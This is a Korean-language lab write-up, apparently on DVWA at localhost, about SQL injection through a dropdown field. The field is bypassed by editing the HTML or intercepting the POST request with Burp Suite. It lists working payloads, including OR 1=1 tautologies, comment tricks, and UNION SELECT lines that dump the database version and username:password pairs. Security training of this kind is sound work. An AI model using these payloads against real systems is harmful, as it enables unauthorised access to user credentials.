 목표
사용자 ID를 입력했을 때 DB에서 정보를 가져오는 웹 페이지에 SQL Injection을 시도해 모든 사용자 목록 또는 관리자(admin) 계정의 정보를 가져오기

<form action="#" method="POST">
  <p>
    User ID:
    <select name="id">
      <option value="1">1</option>
      <option value="2">2</option>
      ...
    </select>
    <input type="submit" name="Submit" value="Submit">
  </p>
</form>

사용자에게는 select 드롭다운만 보여주고, 입력은 제한하려는 의도입니다.
즉, 직접 SQL 인젝션 페이로드를 넣을 수 없도록 막아놓은 UI입니다.

방법은 2가지가 있다. 
방법 1: F12로 <select> → <input>으로 바꾸기
- <select name="id">
-   <option value="1">1</option>
-   ...
- </select>
+ <input type="text" name="id" value="1 OR 1=1">

이렇게 바꾸면 드롭다운이 입력창으로 변한다. 

시도 1: 논리 연산자 사용
1 OR 1=1
결과: 모든 사용자 출력된다면 성공!

✅ 시도 2: 주석 활용
matlab
1' OR '1'='1' -- 
또는

vbnet
1' OR 1=1 -- 
➡ -- 는 뒤에 오는 쿼리 무시 용도
➡ 작은 따옴표(') 유무에 따라 차이 있음

✅ 시도 3: UNION SELECT 이용 (고급)
sql
1 UNION SELECT null, version() --
→ 성공 시, MySQL 버전이 두 번째 컬럼에 출력됨

또는 사용자 정보:

sql
1 UNION SELECT user(), database() --
🎯 4단계: admin 계정 찾기
sql
1' OR username='admin' -- 
또는

sql
1 UNION SELECT null, concat(user, ':', password) FROM users --
(이건 테이블 구조를 안다고 가정)

첫시도에 답이 나왔다. 

방법 2: Burp Suite 또는 브라우저 도구로 POST 요청 수정
이건 조금 더 해커스러운 방법입니다.

브라우저에서 ID를 아무거나 선택하고 Submit

개발자 도구 > Network 탭 켜기

Submit 누르면 vulnerabilities/sqli에 대한 요청이 생김 → 클릭

Payload 수정:

bash
id=1 OR 1=1
다시 전송

또는 Burp Suite로 요청 가로채서 POST 파라미터 수정 가능:

http
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
Host: localhost
...
id=1 OR 1=1&Submit=Submit


🛠 팁: 실패하지 않는 안전한 Payload 예시
sql
id=1 OR 1=1
id=1 OR 'a'='a'
id=1 UNION SELECT user,password FROM users
(단계별로 실습하면서 시도하세요!)

